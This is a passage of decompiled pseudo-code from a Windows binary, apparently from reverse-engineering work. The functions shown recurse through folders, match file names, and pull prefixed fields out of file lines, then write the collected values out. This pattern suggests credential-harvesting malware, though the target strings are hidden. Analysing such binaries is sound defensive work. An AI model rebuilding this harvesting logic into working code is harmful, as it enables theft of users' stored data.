          FUN_0039c200(this,local_540,local_114,param_3,param_4,param_5,param_6,param_7,param_8);
        }
LAB_0039c5c5:
        trim_string((undefined (*) [16])local_21c,0,0x104);
        trim_string((undefined (*) [16])local_324,0,0x104);
      }
      iVar3 = (*_DAT_003d9438)(iVar2,local_56c);
      uVar7 = (undefined)unaff_ESI;
    } while (iVar3 != 0);
    (*_DAT_003d93a8)(iVar2);
    uVar5 = extraout_EDX;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar5,uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall
FUN_0039c630(void *this,int param_1,void *param_2,undefined4 param_3,int *param_4,undefined4 param_5
            )

{
  int iVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  undefined4 unaff_ESI;
  undefined8 uVar4;
  undefined uVar5;
  byte local_360 [44];
  undefined local_334 [276];
  undefined local_220 [264];
  undefined local_118 [268];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  (*_DAT_003d9374)(local_220,&DAT_003d0aa8,param_2);
  uVar4 = (*_DAT_003d95e0)(local_220,local_360);
  uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
  iVar1 = (int)uVar4;
  uVar5 = (undefined)unaff_ESI;
  if (iVar1 != -1) {
    do {
      iVar2 = (*_DAT_003d9550)(local_334,&DAT_003d0ab0);
      if ((iVar2 != 0) && (iVar2 = (*_DAT_003d9550)(local_334,&DAT_003d0ab4), iVar2 != 0)) {
        (*_DAT_003d9374)(local_118,"%s\\%s",param_2,local_334);
        iVar2 = (*_DAT_003d9550)(local_334,DAT_003d8f5c);
        if (iVar2 == 0) {
          FUN_0039b890(param_3,param_4,local_118,param_1);
        }
        else {
          iVar2 = (*_DAT_003d9550)(local_334,DAT_003d8a6c);
          if (iVar2 == 0) {
            FUN_0039bf80(param_3,param_4,param_1);
            FUN_0039c630(this,(int)local_334,local_118,param_3,param_4,param_5);
            goto LAB_0039c876;
          }
          iVar2 = (*_DAT_003d9550)(local_334,DAT_003d92d0);
          if (iVar2 == 0) {
            iVar2 = (*_DAT_003d9330)(param_2);
            if (iVar2 == 0) {
              FUN_0039b600(param_2,param_3);
            }
          }
          else {
            iVar2 = (*_DAT_003d9550)(local_334,DAT_003d8af0);
            if (iVar2 == 0) {
              if (*(char *)((int)this + 2) != '\0') {
                FUN_0039bd20(param_3,param_4,param_1);
              }
            }
            else {
              if ((local_360[0] & 0x10) == 0) goto LAB_0039c876;
            }
          }
        }
        FUN_0039c630(this,(int)local_334,local_118,param_3,param_4,param_5);
      }
LAB_0039c876:
      iVar2 = (*_DAT_003d9438)(iVar1,local_360);
      uVar5 = (undefined)unaff_ESI;
    } while (iVar2 != 0);
    (*_DAT_003d93a8)(iVar1);
    uVar3 = extraout_EDX;
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,uVar3,uVar5);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0039c8c0(undefined4 param_1)

{
  char *pcVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  int *piVar5;
  size_t sVar6;
  uint uVar7;
  undefined4 ****ppppuVar8;
  uint uVar9;
  int ****ppppiVar10;
  int ****ppppiVar11;
  undefined4 extraout_EDX;
  undefined4 uVar12;
  code **ppcVar13;
  int **in_FS_OFFSET;
  bool bVar14;
  ulonglong uVar15;
  undefined4 *in_stack_fffff61c;
  undefined uVar16;
  undefined *local_990 [26];
  undefined **local_928 [18];
  undefined *local_8e0;
  uint local_8dc;
  undefined4 local_8d8;
  uint local_8d4;
  int local_8d0;
  uint local_8cc;
  void *local_8c8;
  uint local_8b4;
  void *local_8ac [4];
  undefined4 local_89c;
  uint local_898;
  void *local_890;
  undefined4 local_880;
  uint local_87c;
  undefined4 ****local_874 [4];
  uint local_864;
  uint local_860;
  undefined4 ****local_858 [4];
  uint local_848;
  uint local_844;
  undefined4 ****local_83c [4];
  uint local_82c;
  uint local_828;
  undefined4 ****local_820 [4];
  undefined4 ***local_810;
  undefined4 ***local_80c;
  int ****local_804 [4];
  uint local_7f4;
  uint local_7f0;
  undefined local_7e8 [1000];
  char local_400 [1000];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3b6e;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8d8 = param_1;
  trim_string((undefined (*) [16])local_400,0,1000);
  trim_string((undefined (*) [16])local_7e8,0,1000);
  iVar3 = (*_DAT_003d9500)();
  uVar4 = (iVar3 < 0) - 1 & (uint)local_7e8;
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  uVar15 = (*_DAT_003d9470)();
  uVar12 = (undefined4)(uVar15 >> 0x20);
  uVar16 = (undefined)uVar4;
  if (((int)uVar15 != -1) && ((uVar15 & 0x10) == 0)) {
    FUN_003a1cb0(local_990,local_400);
    local_8._0_1_ = 0;
    local_8._1_3_ = 0;
    local_7f0 = 0xf;
    local_7f4 = 0;
    local_804[0] = (int ****)((uint)local_804[0] & 0xffffff00);
    local_8cc = 0;
    local_844 = 0xf;
    local_848 = 0;
    local_858[0] = (undefined4 ****)((uint)local_858[0] & 0xffffff00);
    local_860 = 0xf;
    local_864 = 0;
    local_874[0] = (undefined4 ****)((uint)local_874[0] & 0xffffff00);
    local_828 = 0xf;
    local_82c = 0;
    local_83c[0] = (undefined4 ****)((uint)local_83c[0] & 0xffffff00);
    local_80c = (undefined4 ***)0xf;
    local_810 = (undefined4 ***)0x0;
    local_820[0] = (undefined4 ****)((uint)local_820[0] & 0xffffff00);
    while( true ) {
      FUN_00399850();
      local_8._0_1_ = 6;
      piVar5 = (int *)FUN_003a3240();
      uVar7 = local_8d4;
      local_8._0_1_ = 5;
      if (local_8d4 != 0) {
        std::_Lockit::_Lockit((_Lockit *)&local_8d0,0);
        iVar3 = *(int *)(uVar7 + 4);
        if ((iVar3 != 0) && (iVar3 != -1)) {
          *(int *)(uVar7 + 4) = iVar3 + -1;
        }
        iVar3 = *(int *)(uVar7 + 4);
        FUN_003ae995(&local_8d0);
        ppcVar13 = (code **)(~-(uint)(iVar3 != 0) & uVar7);
        if (ppcVar13 != (code **)0x0) {
          (**(code **)*ppcVar13)();
        }
      }
      bVar2 = (**(code **)(*piVar5 + 0x18))();
      local_8dc = local_8dc & 0xffffff00 | (uint)bVar2;
      piVar5 = FUN_003a35d0((int *)local_990,local_804,bVar2);
      pcVar1 = DAT_003d8b20;
      uVar16 = (undefined)uVar4;
      if ((*(int *)(*piVar5 + 4) + (int)piVar5 &
          ~-(uint)((*(uint *)(*(int *)(*piVar5 + 4) + 0xc + (int)piVar5) & 6) != 0)) == 0) break;
      sVar6 = _strlen(DAT_003d8b20);
      local_8cc = FUN_003959f0(local_804,pcVar1,sVar6);
      if (local_8cc != 0xffffffff) {
        uVar7 = 9;
        if ((8 < local_7f4) || (uVar7 = local_7f4, local_7f4 != 0)) {
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          FID_conflict__memcpy(ppppiVar10,(void *)((int)ppppiVar10 + uVar7),local_7f4 - uVar7);
          local_7f4 = local_7f4 - uVar7;
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          *(undefined *)(local_7f4 + (int)ppppiVar10) = 0;
        }
        ppppiVar10 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar10 = (int ****)local_804;
        }
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        iVar3 = (local_7f4 - 7) + (int)ppppiVar11;
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        if (iVar3 == 0) {
          piVar5 = (int *)0x0;
        }
        else {
          piVar5 = (int *)(iVar3 - (int)ppppiVar11);
        }
        if (local_7f4 + (int)ppppiVar10 == 0) {
          uVar7 = 0;
        }
        else {
          uVar7 = (local_7f4 + (int)ppppiVar10) - iVar3;
        }
        FUN_003898c0(local_804,piVar5,uVar7);
        FUN_003896c0(local_858,(int **)local_804,(int *)0x0,(int *)0xffffffff);
      }
      pcVar1 = DAT_003d8e04;
      sVar6 = _strlen(DAT_003d8e04);
      uVar7 = FUN_003959f0(local_804,pcVar1,sVar6);
      if (uVar7 != 0xffffffff) {
        uVar7 = 9;
        if ((8 < local_7f4) || (uVar7 = local_7f4, local_7f4 != 0)) {
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          FID_conflict__memcpy(ppppiVar10,(void *)((int)ppppiVar10 + uVar7),local_7f4 - uVar7);
          local_7f4 = local_7f4 - uVar7;
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          *(undefined *)(local_7f4 + (int)ppppiVar10) = 0;
        }
        ppppiVar10 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar10 = (int ****)local_804;
        }
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        iVar3 = (local_7f4 - 7) + (int)ppppiVar11;
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        if (iVar3 == 0) {
          piVar5 = (int *)0x0;
        }
        else {
          piVar5 = (int *)(iVar3 - (int)ppppiVar11);
        }
        if (local_7f4 + (int)ppppiVar10 == 0) {
          uVar7 = 0;
        }
        else {
          uVar7 = (local_7f4 + (int)ppppiVar10) - iVar3;
        }
        FUN_003898c0(local_804,piVar5,uVar7);
        FUN_003896c0(local_874,(int **)local_804,(int *)0x0,(int *)0xffffffff);
      }
      pcVar1 = DAT_003d8f98;
      sVar6 = _strlen(DAT_003d8f98);
      uVar7 = FUN_003959f0(local_804,pcVar1,sVar6);
      if (uVar7 != 0xffffffff) {
        uVar7 = 9;
        if ((8 < local_7f4) || (uVar7 = local_7f4, local_7f4 != 0)) {
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          FID_conflict__memcpy(ppppiVar10,(void *)((int)ppppiVar10 + uVar7),local_7f4 - uVar7);
          local_7f4 = local_7f4 - uVar7;
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          *(undefined *)(local_7f4 + (int)ppppiVar10) = 0;
        }
        ppppiVar10 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar10 = (int ****)local_804;
        }
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        iVar3 = (int)ppppiVar11 + (local_7f4 - 7);
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        if (iVar3 == 0) {
          piVar5 = (int *)0x0;
        }
        else {
          piVar5 = (int *)(iVar3 - (int)ppppiVar11);
        }
        if ((int)ppppiVar10 + local_7f4 == 0) {
          uVar7 = 0;
        }
        else {
          uVar7 = ((int)ppppiVar10 + local_7f4) - iVar3;
        }
        FUN_003898c0(local_804,piVar5,uVar7);
        FUN_003896c0(local_83c,(int **)local_804,(int *)0x0,(int *)0xffffffff);
      }
      pcVar1 = DAT_003d8fdc;
      sVar6 = _strlen(DAT_003d8fdc);
      local_8cc = FUN_003959f0(local_804,pcVar1,sVar6);
      if (local_8cc != 0xffffffff) {
        uVar7 = 0x1b;
        if ((0x1a < local_7f4) || (uVar7 = local_7f4, local_7f4 != 0)) {
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          FID_conflict__memcpy(ppppiVar10,(void *)((int)ppppiVar10 + uVar7),local_7f4 - uVar7);
          local_7f4 = local_7f4 - uVar7;
          ppppiVar10 = local_804[0];
          if (local_7f0 < 0x10) {
            ppppiVar10 = (int ****)local_804;
          }
          *(undefined *)((int)ppppiVar10 + local_7f4) = 0;
        }
        ppppiVar10 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar10 = (int ****)local_804;
        }
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        iVar3 = (int)ppppiVar11 + (local_7f4 - 7);
        ppppiVar11 = local_804[0];
        if (local_7f0 < 0x10) {
          ppppiVar11 = (int ****)local_804;
        }
        if (iVar3 == 0) {
          piVar5 = (int *)0x0;
        }
        else {
          piVar5 = (int *)(iVar3 - (int)ppppiVar11);
        }
        if ((int)ppppiVar10 + local_7f4 == 0) {
          uVar7 = 0;
        }
        else {
          uVar7 = ((int)ppppiVar10 + local_7f4) - iVar3;
        }
        FUN_003898c0(local_804,piVar5,uVar7);
        local_8e0 = &stack0xfffff61c;
        in_stack_fffff61c = (undefined4 *)((uint)in_stack_fffff61c & 0xffffff00);
        FUN_003896c0(&stack0xfffff61c,(int **)local_804,(int *)0x0,(int *)0xffffffff);
        ppppuVar8 = (undefined4 ****)FUN_003a5340(in_stack_fffff61c);
        if (local_820 != (undefined4 *****)ppppuVar8) {
          if ((undefined4 ***)0xf < local_80c) {
            FUN_003aee4b(local_820[0]);
          }
          local_80c = (undefined4 ***)0xf;
          local_810 = (undefined4 ***)0x0;
          local_820[0] = (undefined4 ****)((uint)local_820[0] & 0xffffff00);
          if (ppppuVar8[5] < (undefined4 ***)0x10) {
            FID_conflict__memcpy(local_820,ppppuVar8,(int)ppppuVar8[4] + 1);
          }
          else {
            local_820[0] = (undefined4 ****)*ppppuVar8;
            *ppppuVar8 = (undefined4 ***)0x0;
          }
          local_810 = ppppuVar8[4];
          local_80c = ppppuVar8[5];
          ppppuVar8[4] = (undefined4 ***)0x0;
          ppppuVar8[5] = (undefined4 ***)0x0;
        }
        local_8._0_1_ = 5;
        if (0xf < local_8b4) {
          FUN_003aee4b(local_8c8);
        }
      }
      sVar6 = _strlen("");
      uVar7 = local_848;
      uVar9 = local_848;
      if (sVar6 <= local_848) {
        uVar9 = sVar6;
      }
      ppppuVar8 = local_858[0];
      if (local_844 < 0x10) {
        ppppuVar8 = local_858;
      }
      iVar3 = _memcmp(ppppuVar8,&DAT_003ce656,uVar9);
      bVar14 = iVar3 == 0;
      if (bVar14) {
        if (uVar7 < sVar6) {
          uVar7 = 0xffffffff;
        }
        else {
          uVar7 = (uint)(uVar7 != sVar6);
        }
        bVar14 = uVar7 == 0;
      }
      if (!bVar14) {
        sVar6 = _strlen("");
        uVar7 = local_864;
        uVar9 = local_864;
        if (sVar6 <= local_864) {
          uVar9 = sVar6;
        }
        ppppuVar8 = local_874[0];
        if (local_860 < 0x10) {
          ppppuVar8 = local_874;
        }
        iVar3 = _memcmp(ppppuVar8,&DAT_003ce656,uVar9);
        bVar14 = iVar3 == 0;
        if (bVar14) {
          if (uVar7 < sVar6) {
            uVar7 = 0xffffffff;
          }
          else {
            uVar7 = (uint)(uVar7 != sVar6);
          }
          bVar14 = uVar7 == 0;
        }
        if (!bVar14) {
          sVar6 = _strlen("");
          uVar7 = local_82c;
          uVar9 = local_82c;
          if (sVar6 <= local_82c) {
            uVar9 = sVar6;
          }
          ppppuVar8 = local_83c[0];
          if (local_828 < 0x10) {
            ppppuVar8 = local_83c;
          }
          iVar3 = _memcmp(ppppuVar8,&DAT_003ce656,uVar9);
          bVar14 = iVar3 == 0;
          if (bVar14) {
            if (uVar7 < sVar6) {
              uVar7 = 0xffffffff;
            }
            else {
              uVar7 = (uint)(uVar7 != sVar6);
            }
            bVar14 = uVar7 == 0;
          }
          if ((!bVar14) && (uVar7 = FUN_003a3380(), uVar12 = local_8d8, (char)uVar7 != '\0')) {
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            FUN_00395c10(local_8ac,local_858);
            local_8._0_1_ = 8;
            FUN_00398680();
            local_8 = CONCAT31(local_8._1_3_,9);
            (*_DAT_003d9520)();
            if (0xf < local_87c) {
              FUN_003aee4b(local_890);
            }
            local_8._0_1_ = 5;
            local_87c = 0xf;
            local_880 = 0;
            local_890 = (void *)((uint)local_890 & 0xffffff00);
            if (0xf < local_898) {
              FUN_003aee4b(local_8ac[0]);
            }
            in_stack_fffff61c = (undefined4 *)&DAT_003ce668;
            local_898 = 0xf;
            local_89c = 0;
            local_8ac[0] = (void *)((uint)local_8ac[0] & 0xffffff00);
            (*_DAT_003d9520)(uVar12);
            (*_DAT_003d9520)(uVar12,DAT_003d8c9c);
            ppppuVar8 = local_83c[0];
            if (local_828 < 0x10) {
              ppppuVar8 = local_83c;
            }
            (*_DAT_003d9520)(uVar12,ppppuVar8);
            (*_DAT_003d9520)(uVar12,&DAT_003ce668);
            (*_DAT_003d9520)(uVar12,DAT_003d919c);
            ppppuVar8 = local_820[0];
            if (local_80c < (undefined4 ***)0x10) {
              ppppuVar8 = local_820;
            }
            (*_DAT_003d9520)(uVar12,ppppuVar8);
            (*_DAT_003d9520)(uVar12,&DAT_003d0c34);
            piVar5 = (int *)_strlen("");
            FUN_003894c0(local_858,(int **)&DAT_003ce656,piVar5);
            piVar5 = (int *)_strlen("");
            FUN_003894c0(local_874,(int **)&DAT_003ce656,piVar5);
            piVar5 = (int *)_strlen("");
            FUN_003894c0(local_83c,(int **)&DAT_003ce656,piVar5);
            piVar5 = (int *)_strlen("");
            FUN_003894c0(local_820,(int **)&DAT_003ce656,piVar5);
            DAT_003d932c = DAT_003d932c + 1;
          }
        }
      }
    }
    if ((undefined4 ***)0xf < local_80c) {
      FUN_003aee4b(local_820[0]);
    }
    local_80c = (undefined4 ***)0xf;
    local_810 = (undefined4 ***)0x0;
    local_820[0] = (undefined4 ****)((uint)local_820[0] & 0xffffff00);
    if (0xf < local_828) {
      FUN_003aee4b(local_83c[0]);
    }
    local_828 = 0xf;
    local_82c = 0;
    local_83c[0] = (undefined4 ****)((uint)local_83c[0] & 0xffffff00);
    if (0xf < local_860) {
      FUN_003aee4b(local_874[0]);
    }
    local_860 = 0xf;
    local_864 = 0;
    local_874[0] = (undefined4 ****)((uint)local_874[0] & 0xffffff00);
    if (0xf < local_844) {
      FUN_003aee4b(local_858[0]);
    }
    local_844 = 0xf;
    local_848 = 0;
    local_858[0] = (undefined4 ****)((uint)local_858[0] & 0xffffff00);
    if (0xf < local_7f0) {
      FUN_003aee4b(local_804[0]);
    }
    local_7f0 = 0xf;
    local_7f4 = 0;
    local_804[0] = (int ****)((uint)local_804[0] & 0xffffff00);
    local_8 = 0xffffffff;
    FUN_003a1e20(local_928);
    local_928[0] = std::ios_base::vftable;
    std::ios_base::_Ios_base_dtor((ios_base *)local_928);
    uVar12 = extraout_EDX;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar12,uVar16);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0039d440(int param_1)

{
  void **ppvVar1;
  int **ppiVar2;
  void **ppvVar3;
  int iVar4;
  int *piVar5;
  undefined4 *puVar6;
  void *pvVar7;
  undefined4 *puVar8;
  int ***pppiVar9;
  void *pvVar10;
  int **extraout_EDX;
  int **ppiVar11;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  int **ppiVar12;
  int **in_FS_OFFSET;
  undefined8 uVar13;
  uint in_stack_ffffeed0;
  undefined uVar14;
  int **local_1090;
  int **local_108c;
  int **local_1088;
  int **local_1080;
  void *local_107c;
  uint local_1068;
  void *local_1060 [4];
  undefined4 local_1050;
  uint local_104c;
  void *local_1044 [4];
  undefined4 local_1034;
  uint local_1030;
  void *local_1028 [4];
  undefined4 local_1018;
  uint local_1014;
  void *local_100c [4];
  undefined4 local_ffc;
  uint local_ff8;
  void *local_ff0 [4];
  undefined4 local_fe0;
  uint local_fdc;
  void *local_fd4;
  void **local_fc8;
  void **local_fc4;
  uint local_fc0;
  undefined local_fb8 [1000];
  int *local_bd0 [250];
  undefined local_7e8 [1000];
  int *local_400 [250];
  uint local_18;
  undefined4 uStack20;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c4295;
  local_10 = *in_FS_OFFSET;
  uStack20 = 0x39d45b;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  trim_string((undefined (*) [16])local_fb8,0,1000);
  iVar4 = (*_DAT_003d9500)();
  local_104c = 0xf;
  local_1050 = 0;
  local_1060[0] = (void *)((uint)local_1060[0] & 0xffffff00);
  ppiVar12 = (int **)((iVar4 < 0) - 1 & (uint)local_fb8);
  piVar5 = (int *)_strlen((char *)ppiVar12);
  FUN_003894c0(local_1060,ppiVar12,piVar5);
  local_8 = 0;
  trim_string((undefined (*) [16])local_400,0,1000);
  trim_string((undefined (*) [16])local_bd0,0,1000);
  trim_string((undefined (*) [16])local_7e8,0,1000);
  (*_DAT_003d9500)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  trim_string((undefined (*) [16])local_7e8,0,1000);
  (*_DAT_003d9500)();
  ppiVar12 = local_bd0;
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  local_1080 = (int **)&stack0xffffeed0;
  pvVar10 = (void *)(in_stack_ffffeed0 & 0xffffff00);
  piVar5 = (int *)_strlen((char *)local_400);
  FUN_003894c0(&stack0xffffeed0,local_400,piVar5);
  FUN_003a5b90(&local_1090,pvVar10);
  local_8._0_1_ = 1;
  local_1080 = local_108c;
  ppiVar11 = local_1090;
  if (local_1090 != local_108c) {
    do {
      local_fd4 = (void *)((uint)local_fd4 & 0xffff0000);
      local_fc0 = 7;
      local_fc4 = (void **)0x0;
      FUN_00398300(ppiVar11,(int *)0x0);
      local_8._0_1_ = 2;
      FUN_003a5840();
      local_8._0_1_ = 3;
      puVar6 = FUN_00395c10(local_1028,local_1060);
      local_8._0_1_ = 4;
      puVar6 = (undefined4 *)FUN_00389b80(puVar6,(undefined *)local_100c);
      local_8._0_1_ = 5;
      pvVar7 = (void *)FUN_003a5840();
      local_8._0_1_ = 6;
      puVar8 = (undefined4 *)FUN_00389b30(local_1044,pvVar7);
      local_8 = CONCAT31(local_8._1_3_,7);
      if (0xf < (uint)puVar6[5]) {
        puVar6 = (undefined4 *)*puVar6;
      }
      if (0xf < (uint)puVar8[5]) {
        puVar8 = (undefined4 *)*puVar8;
      }
      piVar5 = *(int **)(param_1 + 0x20);
      if (piVar5 == (int *)0x0) {
        _DAT_003d9814 = 0x10000;
      }
      else {
        if (*piVar5 == 2) {
          _DAT_003d9814 = FUN_003ad750((char **)piVar5[1],(int)puVar6,puVar8,0,2);
        }
        else {
          _DAT_003d9814 = 0x80000;
        }
      }
      if (0xf < local_1030) {
        FUN_003aee4b(local_1044[0]);
      }
      local_1030 = 0xf;
      local_1034 = 0;
      local_1044[0] = (void *)((uint)local_1044[0] & 0xffffff00);
      if (0xf < local_fdc) {
        FUN_003aee4b(local_ff0[0]);
      }
      local_fdc = 0xf;
      local_fe0 = 0;
      local_ff0[0] = (void *)((uint)local_ff0[0] & 0xffffff00);
      if (0xf < local_ff8) {
        FUN_003aee4b(local_100c[0]);
      }
      local_ff8 = 0xf;
      local_ffc = 0;
      local_100c[0] = (void *)((uint)local_100c[0] & 0xffffff00);
      if (0xf < local_1014) {
        FUN_003aee4b(local_1028[0]);
      }
      local_1014 = 0xf;
      local_1018 = 0;
      local_1028[0] = (void *)((uint)local_1028[0] & 0xffffff00);
      if (0xf < local_1068) {
        FUN_003aee4b(local_107c);
      }
      local_8._0_1_ = 1;
      if (7 < local_fc0) {
        FUN_003aee4b(local_fd4);
      }
      ppiVar11 = ppiVar11 + 7;
    } while (ppiVar11 != local_1080);
  }
  local_1080 = (int **)&stack0xffffeed0;
  pvVar10 = (void *)((uint)pvVar10 & 0xffffff00);
  piVar5 = (int *)_strlen((char *)local_bd0);
  FUN_003894c0(&stack0xffffeed0,local_bd0,piVar5);
  uVar13 = FUN_003a5b90(&local_fc8,pvVar10);
  ppiVar11 = (int **)((ulonglong)uVar13 >> 0x20);
  pppiVar9 = (int ***)uVar13;
  if (&local_1090 != pppiVar9) {
    if (local_1090 != (int **)0x0) {
      FUN_00398480();
      FUN_003aee4b(local_1090);
    }
    local_1090 = *pppiVar9;
    local_108c = pppiVar9[1];
    ppiVar11 = pppiVar9[2];
    *pppiVar9 = (int **)0x0;
    pppiVar9[1] = (int **)0x0;
    pppiVar9[2] = (int **)0x0;
    local_1088 = ppiVar11;
  }
  ppvVar3 = local_fc4;
  local_8 = CONCAT31(local_8._1_3_,1);
  ppvVar1 = local_fc8;
  if (local_fc8 != (void **)0x0) {
    for (; ppvVar1 != ppvVar3; ppvVar1 = ppvVar1 + 7) {
      if ((void *)0x7 < ppvVar1[5]) {
        FUN_003aee4b(*ppvVar1);
      }
      ppvVar1[5] = (void *)0x7;
      ppvVar1[4] = (void *)0x0;
      *(undefined2 *)ppvVar1 = 0;
    }
    FUN_003aee4b(local_fc8);
    ppiVar11 = extraout_EDX;
  }
  uVar13 = CONCAT44(ppiVar11,_DAT_003d9814);
  local_1080 = local_108c;
  ppiVar11 = local_1090;
  if (local_1090 != local_108c) {
    do {
      local_fc0 = 7;
      local_fc4 = (void **)0x0;
      local_fd4 = (void *)((uint)local_fd4 & 0xffff0000);
      FUN_00398300(ppiVar11,(int *)0x0);
      local_8._0_1_ = 9;
      FUN_003a5840();
      local_8._0_1_ = 10;
      puVar6 = FUN_00395c10(local_1044,local_1060);
      local_8._0_1_ = 0xb;
      puVar6 = (undefined4 *)FUN_00389b80(puVar6,(undefined *)local_ff0);
      local_8._0_1_ = 0xc;
      pvVar10 = (void *)FUN_003a5840();
      local_8._0_1_ = 0xd;
      puVar8 = (undefined4 *)FUN_00389b30(local_1028,pvVar10);
      local_8 = CONCAT31(local_8._1_3_,0xe);
      if (0xf < (uint)puVar6[5]) {
        puVar6 = (undefined4 *)*puVar6;
      }
      if (0xf < (uint)puVar8[5]) {
        puVar8 = (undefined4 *)*puVar8;
      }
      piVar5 = *(int **)(param_1 + 0x20);
      if (piVar5 == (int *)0x0) {
        uVar13 = CONCAT44(puVar6,0x10000);
      }
      else {
        if (*piVar5 == 2) {
          uVar13 = FUN_003ad750((char **)piVar5[1],(int)puVar6,puVar8,0,2);
        }
        else {
          uVar13 = CONCAT44(puVar6,0x80000);
        }
      }
      _DAT_003d9814 = (undefined4)uVar13;
      if (0xf < local_1014) {
        FUN_003aee4b(local_1028[0]);
        uVar13 = CONCAT44(extraout_EDX_00,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar13;
      local_1014 = 0xf;
      local_1018 = 0;
      local_1028[0] = (void *)((uint)local_1028[0] & 0xffffff00);
      if (0xf < local_ff8) {
        FUN_003aee4b(local_100c[0]);
        uVar13 = CONCAT44(extraout_EDX_01,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar13;
      local_ff8 = 0xf;
      local_ffc = 0;
      local_100c[0] = (void *)((uint)local_100c[0] & 0xffffff00);
      if (0xf < local_fdc) {
        FUN_003aee4b(local_ff0[0]);
        uVar13 = CONCAT44(extraout_EDX_02,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar13;
      local_fdc = 0xf;
      local_fe0 = 0;
      local_ff0[0] = (void *)((uint)local_ff0[0] & 0xffffff00);
      if (0xf < local_1030) {
        FUN_003aee4b(local_1044[0]);
        uVar13 = CONCAT44(extraout_EDX_03,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar13;
      local_1030 = 0xf;
      local_1034 = 0;
      local_1044[0] = (void *)((uint)local_1044[0] & 0xffffff00);
      if (0xf < local_1068) {
        FUN_003aee4b(local_107c);
        uVar13 = CONCAT44(extraout_EDX_04,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar13;
      local_8 = CONCAT31(local_8._1_3_,1);
      if (7 < local_fc0) {
        FUN_003aee4b(local_fd4);
        uVar13 = CONCAT44(extraout_EDX_05,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar13;
      ppiVar11 = ppiVar11 + 7;
    } while (ppiVar11 != local_1080);
  }
  ppiVar2 = local_108c;
  _DAT_003d9814 = (undefined4)uVar13;
  uVar14 = SUB41(ppiVar12,0);
  ppiVar11 = local_1090;
  if (local_1090 != (int **)0x0) {
    for (; ppiVar11 != ppiVar2; ppiVar11 = ppiVar11 + 7) {
      if ((int *)0x7 < ppiVar11[5]) {
        FUN_003aee4b(*ppiVar11);
      }
      uVar14 = SUB41(ppiVar12,0);
      ppiVar11[5] = (int *)0x7;
      ppiVar11[4] = (int *)0x0;
      *(undefined2 *)ppiVar11 = 0;
    }
    FUN_003aee4b(local_1090);
    uVar13 = CONCAT44(extraout_EDX_06,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar13;
  local_1090 = (int **)0x0;
  local_108c = (int **)0x0;
  local_1088 = (int **)0x0;
  if (0xf < local_104c) {
    FUN_003aee4b(local_1060[0]);
